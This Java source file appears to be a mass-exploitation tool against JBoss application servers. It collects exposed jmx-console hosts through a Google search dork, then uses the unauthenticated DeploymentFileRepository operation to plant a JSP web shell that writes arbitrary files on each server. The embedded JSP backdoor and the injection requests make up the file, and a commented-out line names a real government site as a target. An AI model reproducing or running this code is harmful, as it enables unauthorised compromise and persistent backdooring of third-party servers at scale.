package cn.geniusman.entrance;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLEncoder;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;
import java.util.Map.Entry;

import org.apache.commons.httpclient.DefaultHttpMethodRetryHandler;
import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.HttpStatus;
import org.apache.commons.httpclient.methods.GetMethod;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.methods.StringRequestEntity;
import org.apache.commons.httpclient.params.HttpClientParams;
import org.apache.commons.httpclient.params.HttpMethodParams;
import org.htmlcleaner.CleanerProperties;
import org.htmlcleaner.HtmlCleaner;
import org.htmlcleaner.TagNode;

public class Entrance {

	private static final int HTTP_SOCKET_TIMEOUT = 15000;
	// private static final String KEY_WORD =
	// "allinurl:+%2Fco/jmx-console%2FHtmlAdaptor?";
	// private static final String KEY_WORD = "intitle:%22MBean+Inspector%22";

	private static final String KEY_WORD = "allinurl:+%3Faction%3DdisplayMBeans";
	private static final int NUM_PER_PAGE = 100;
	private static final String SEARCH_URL = "http://www.google.com.hk/search?num="
			+ NUM_PER_PAGE
			+ "&newwindow=1&safe=strict&site=webhp&q="
			+ KEY_WORD + "&btnG=Google+%E6%90%9C%E7%B4%A2&start=0&sa=N";

	/**
	 * the entrance of main
	 * 
	 * @param args
	 * @throws Throwable
	 */
	public static void main(String[] args) throws Throwable {

		// System.out.println(getInfos());
		// postJboss("http://khadamate.tra.gov.ae");

		HttpClientParams hcp = new HttpClientParams();
		hcp.setSoTimeout(HTTP_SOCKET_TIMEOUT);
		final HttpClient client = new HttpClient(hcp);
		client.getHttpConnectionManager().getParams()
				.setConnectionTimeout(HTTP_SOCKET_TIMEOUT);

		GetMethod gm = null;
		BufferedReader br = null;
		try {
			gm = new GetMethod(SEARCH_URL);
			gm.setRequestHeader("Content-type", "text/xml");
			client.executeMethod(gm);

			final int statusCode = gm.getStatusCode();
			System.out.println(statusCode);

			br = new BufferedReader(new InputStreamReader(
					gm.getResponseBodyAsStream()));

			final StringBuilder body = new StringBuilder();
			String line;
			while ((line = br.readLine()) != null) {
				body.append(line);
			}

			System.out.println(line);

			final CleanerProperties cp = new CleanerProperties();
			cp.setUseCdataForScriptAndStyle(true);
			cp.setRecognizeUnicodeChars(true);
			cp.setUseEmptyElementTags(true);
			cp.setAdvancedXmlEscape(true);

			final HtmlCleaner hc = new HtmlCleaner(cp);
			final TagNode node = hc.clean(body.toString());

			System.out.println("parse the data from response..");
			addAllTagNode(node);

			System.out.println("post to jboss..");
			printCorrect();
		} finally {
			if (br != null) {
				br.close();
			}

			if (gm != null) {
				gm.releaseConnection();
			}
		}
	}

	static int count = 0;
	static final Map<String, URL> hosts = new HashMap<String, URL>();

	/**
	 * printTagNode
	 * 
	 * @param node
	 */
	private static void addTagNode(final TagNode node) {
		String url = node.getText().toString();
		final String protocol = "http://";

		if (url.indexOf(protocol) <= 0) {
			url = protocol + url;
		}

		URL netUrl = null;
		try {
			netUrl = new URL(url);
			final String host = netUrl.getHost();
			if (!hosts.containsKey(host)) {
				hosts.put(host, netUrl);
			}
		} catch (MalformedURLException ex) {
			System.out.println(netUrl == null ? ""
					: (netUrl.toString() + " error"));
		}
	}

	/**
	 * printCorrect
	 * 
	 * @throws IOException
	 */
	private static void printCorrect() throws IOException {
		final Set<Entry<String, URL>> sets = hosts.entrySet();
		System.out.println(sets.size());

		for (Entry<String, URL> entry : sets) {
			try {
				URL url = entry.getValue();
				final String urlString = url.getProtocol() + "://"
						+ url.getHost() + ":"
						+ (url.getPort() == -1 ? 80 : url.getPort());
				System.out.println(urlString);
				postJboss(urlString);
			} catch (Exception ex) {
				System.out
						.println("Exception occurred while post to Jboss. error message:"
								+ ex.getMessage());
			}

		}
	}

	/**
	 * 
	 * @param node
	 * @throws URISyntaxException
	 */
	private static void addAllTagNode(final TagNode node)
			throws URISyntaxException {
		final TagNode[] tagArray = node.getAllElements(true);
		final TagNode n = node.findElementByName("cite", false);
		if (n != null) {
			addTagNode(n);
		}

		for (final TagNode o : tagArray) {
			addAllTagNode(o);
		}
	}

	/**
	 * postJboss
	 * 
	 * @param httpHost
	 * @throws IOException
	 */
	private static void postJboss(final String httpHost) throws IOException {
		final String jspName = "Codes";
		final String blind = URLEncoder.encode(getInfos(), "utf-8");

		final StringBuffer url = new StringBuffer();
		url.append(httpHost);
		url.append("/jmx-console/HtmlAdaptor?" + "action=invokeOp"
				+ "&name=jboss.admin%3Aservice%3DDeploymentFileRepository"
				+ "&methodIndex=5" + "&arg0=console-mgr.sar/web-console.war/");
		url.append("&arg1=");
		url.append(jspName);
		url.append("&arg2=.jsp");
		url.append("&arg3=");
		url.append(blind);
		url.append("&arg4=True");

		int ret = post(url.toString(), "");
		if (ret == HttpStatus.SC_OK) {
			String targetUrl = httpHost + "/web-console/Codes.jsp";
			if (post(targetUrl, "") == 200) {
				System.out.println(targetUrl + " is injected..");
			}
		} else {
			System.out.println("post to " + httpHost + " and return code is:"
					+ ret + " real url is:" + url);
		}
	}

	private static int post(String url, String body) throws IOException {
		int retCode = -1;
		HttpClientParams hcp = new HttpClientParams();
		hcp.setSoTimeout(1000);
		hcp.setParameter(HttpMethodParams.RETRY_HANDLER,
				new DefaultHttpMethodRetryHandler(0, false));

		HttpClient client = new HttpClient(hcp);
		PostMethod post = new PostMethod(url);
		try {
			if (body != null) {
				StringRequestEntity e = new StringRequestEntity(body, null,
						null);
				post.setRequestHeader("Content-type", "text/xml");
				post.setRequestEntity(e);
				retCode = client.executeMethod(post);
			}
		} finally {
			if (post != null) {
				post.releaseConnection();
			}
		}
		return retCode;
	}

	private static String getInfos() {
		String aa = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>"
				+ "<jsp:directive.page import=\"java.io.File\"/>"
				+ "<jsp:directive.page import=\"java.io.OutputStream\"/>"
				+ "<jsp:directive.page import=\"java.io.FileOutputStream\"/>"
				+ "<html>"
				+ "<head>"
				+ "<title>code</title>"
				+ "<meta http-equiv=\"keywords\" content=\"code\">"
				+ "<meta http-equiv=\"description\" content=\"code\">"
				+ "</head>"
				+ "<%"
				+ "int i=0;"
				+ "String method=request.getParameter(\"act\");"
				+ "if(method!=null&&method.equals(\"up\")){"
				+ "String url=request.getParameter(\"url\");"
				+ "String text=request.getParameter(\"text\");"
				+ "File f=new File(url);"
				+ "if(f.exists()){"
				+ "f.delete();"
				+ "}"
				+ "try{"
				+ "OutputStream o=new FileOutputStream(f);"
				+ "o.write(text.getBytes());"
				+ "o.close();"
				+ "}catch(Exception e){"
				+ "i++;"
				+ "%>"
				+ "upload unsuccessful"
				+ "<%"
				+ "}"
				+ "}"
				+ "if(i==0){"
				+ "%>"
				+ "upload successful"
				+ "<%"
				+ "}"
				+ "%>"
				+ "<body>"
				+ "<form action='?act=up' method='post'>"
				+ "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url\"><br>"
				+ "<textarea rows=\"20\" cols=\"80\" name=\"text\">code</textarea><br>"
				+ "<input type=\"submit\" value=\"up\" name=\"text\"/>"
				+ "</form>" + "</body>" + "</html>";
		return aa;
	}

}
